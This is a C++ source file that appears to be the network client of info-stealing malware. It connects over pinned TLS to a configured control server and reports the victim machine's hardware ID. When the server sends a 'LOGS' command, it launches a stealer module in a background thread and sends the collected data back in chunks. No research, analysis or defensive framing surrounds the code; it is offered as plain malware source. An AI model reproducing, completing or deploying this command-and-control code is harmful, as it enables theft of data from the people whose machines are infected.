
#define NOMINMAX 1

#include <algorithm>
#include <sstream>
#include <iostream>
#include <stdio.h>

#include "Connection.hpp"
#include "../Modules/stealer.hpp"


namespace Connection
{
    SOCKET ClientSocket::TcpClient; // Main socket
    SSL* ClientSocket::SslClient;   // Main SSL stream
    SSL_CTX* ClientSocket::SslContext;
    std::vector<uint8_t> ClientSocket::Buffer(1024);      // Socket buffer
    std::atomic<bool> ClientSocket::IsConnected(false);  // Check socket status
    std::mutex ClientSocket::SendSync; // Sync send
    std::queue<std::vector<uint8_t>> ClientSocket::DataQueue;

    int ClientSocket::VerifyCertificate(int preverify_ok, X509_STORE_CTX* x509_ctx) {
        X509* certificate = X509_STORE_CTX_get_current_cert(x509_ctx);
        return X509_cmp(certificate, Settings::ServerCertificate) == 0;
        //return 1;
    }

    size_t ClientSocket::WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
        size_t total_size = size * nmemb;
        output->append(static_cast<char*>(contents), total_size);
        return total_size;
    }


    bool ClientSocket::InitializeClient() //Connect & reconnect
    {
        try
        {
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                DEBUG_OUTPUT(std::cerr << "Error initializing Winsock" << std::endl;)
                    return false;
            }
            TcpClient = socket(AF_INET, SOCK_STREAM, 0);
            if (TcpClient == INVALID_SOCKET) {
                DEBUG_OUTPUT(std::cerr << "Error creating socket" << std::endl;)
                    WSACleanup();
                return false;
            }
            int bufferSize = 50 * 1024;
            setsockopt(TcpClient, SOL_SOCKET, SO_RCVBUF, reinterpret_cast<char*>(&bufferSize), sizeof(bufferSize));
            setsockopt(TcpClient, SOL_SOCKET, SO_SNDBUF, reinterpret_cast<char*>(&bufferSize), sizeof(bufferSize));
            sockaddr_in hint;
            hint.sin_family = AF_INET;
            hint.sin_port = htons(Settings::Port);
            inet_pton(AF_INET, Settings::Host.c_str(), &hint.sin_addr);

            if (connect(TcpClient, (sockaddr*)&hint, sizeof(hint)) != SOCKET_ERROR)
            {
                // SSL initialization
                SSL_library_init();
                OpenSSL_add_all_algorithms();
                SSL_load_error_strings();
                SslContext = SSL_CTX_new(TLS_method());
                SslClient = SSL_new(SslContext);
                // Explicitly set the SSL/TLS protocol version 
                SSL_set_min_proto_version(SslClient, TLS1_2_VERSION);
                SSL_set_max_proto_version(SslClient, TLS1_2_VERSION);
                SSL_set_fd(SslClient, TcpClient);
                SSL_set_verify(SslClient, SSL_VERIFY_PEER, VerifyCertificate);
                if (SSL_connect(SslClient) < 0) {
                    long sslError = ERR_get_error();
                    char errBuffer[256];
                    ERR_error_string_n(sslError, errBuffer, sizeof(errBuffer));
                    DEBUG_OUTPUT(std::cerr << "InitializeClient()::SSL_connect error: " << errBuffer << std::endl;)
                        IsConnected.store(false);
                    closesocket(TcpClient);
                    WSACleanup();
                    return false;
                }
                IsConnected.store(true);
                // send hwid on connect
                std::ostringstream oss;
                oss << "HWID" << ":" << Helper::WstringToString(Helper::Hwid::HWID());
                if (!Send(Network::EncodeToBytes(oss.str()))) {
                    DataQueue.push(Network::EncodeToBytes(oss.str()));
                }

                return true;
            }
            else {
                DEBUG_OUTPUT(std::cerr << "Can't connect to server, Err #" << WSAGetLastError() << std::endl;)
                    IsConnected.store(false);
                closesocket(TcpClient);
                WSACleanup();
                return false;
            }
        }
        catch (...) {
            DEBUG_OUTPUT(std::cout << "Disconnected!" << std::endl;)
                IsConnected.store(false);
            return false;
        }
    }

    void ClientSocket::Reconnect()
    {
        IsConnected.store(false);
        try {
            WSACleanup();
            if (SslClient) {
                SSL_shutdown(SslClient);
                SSL_shutdown(SslClient);
                SSL_free(SslClient);
                SslClient = nullptr;
            }
            if (SslContext) {
                SSL_CTX_free(SslContext);
                SslContext = nullptr;
            }
            if (TcpClient) {
                closesocket(TcpClient);
            }
        }
        catch (...) {}
    }

    bool ClientSocket::SocketConnected(SOCKET socket) {
        int error = 0;
        socklen_t len = sizeof(error);

        // Check for any error on the socket
        if (getsockopt(socket, SOL_SOCKET, SO_ERROR, reinterpret_cast<char*>(&error), &len) != 0) {
            DEBUG_OUTPUT(std::cerr << "Error in getsockopt: " << WSAGetLastError() << std::endl;)
                return false;
        }
        len = NULL;
        return error == 0;
    }

    void ClientSocket::ReadServerData()
    {
        try
        {
            if (!SocketConnected(TcpClient) || !IsConnected.load())
            {
                IsConnected.store(false);
                return;
            }
            int received = SSL_read(SslClient, Buffer.data(), Buffer.size());
            std::cout << "Received packet: " << received << std::endl;
            if (received > 0)
            {
                std::string packet = Network::DecodeFromBytes(Buffer);
                std::cout << "Received packet: " << packet << std::endl;
                if (packet == "HWID") {
                    std::ostringstream oss;
                    oss << "HWID" << ":" << Helper::WstringToString(Helper::Hwid::HWID());
                    if (!Send(Network::EncodeToBytes(oss.str()))) {
                        DataQueue.push(Network::EncodeToBytes(oss.str()));
                    }
                }
                else if (packet == "LOGS") {
                    std::thread(Core::Stealer::StartStealer).detach();
                }
                std::vector<uint8_t>().swap(Buffer);
                Buffer.assign(1024, 0);
            }
            else {
                IsConnected.store(false);
            }
        }
        catch (...) {
            IsConnected.store(false);
        }
    }

    bool ClientSocket::Send(std::vector<uint8_t> msg)
    {
        std::lock_guard<std::mutex> lock(SendSync);
        try
        {
            if (!IsConnected.load()) {
                DEBUG_OUTPUT(std::cerr << "IsConnected false in Send() function" << std::endl;)
                    return false;
            }
            std::vector<uint8_t> buffersize(sizeof(int));
            int msgLength = static_cast<int>(msg.size());
            std::memcpy(buffersize.data(), &msgLength, sizeof(int));

            int sendResult = SSL_write(SslClient, reinterpret_cast<const char*>(buffersize.data()), static_cast<int>(buffersize.size()));
            if (sendResult == -1) {
                IsConnected.store(false);
                DEBUG_OUTPUT(std::cout << "Failed to send data using SSL in Send() function" << std::endl;)
                return false;
            }
            if (msg.size() > 1000000) {
                DEBUG_OUTPUT(std::cout << "send chunks" << std::endl;)
                int chunkSize = 50 * 1000;
                for (int i = 0; i < msg.size(); i += chunkSize) {
                    int chunkLength = std::min(chunkSize, static_cast<int>(msg.size() - i));
                    sendResult = SSL_write(SslClient, &msg[i], chunkLength);
                    SSL_write(SslClient, "", 0); // Flush the SSL buffer
                    if (sendResult == -1) {
                        DEBUG_OUTPUT(std::cerr << "Send()::Result_2 is <= 0" << std::endl;)
                    }
                }
            }
            else {
                sendResult = SSL_write(SslClient, reinterpret_cast<const char*>(msg.data()), static_cast<int>(msg.size()));
                SSL_write(SslClient, "", 0); //Flush the SSL buffer
                if (sendResult == -1) {
                    DEBUG_OUTPUT(std::cerr << "Send()::Result_3 is <= 0" << std::endl;)
                }
            }
            return true;
        }
        catch (...) {
            IsConnected.store(false);
            DEBUG_OUTPUT(std::cerr << "Unknown error in Send() function" << std::endl;)
                return false;
        }
    }


}
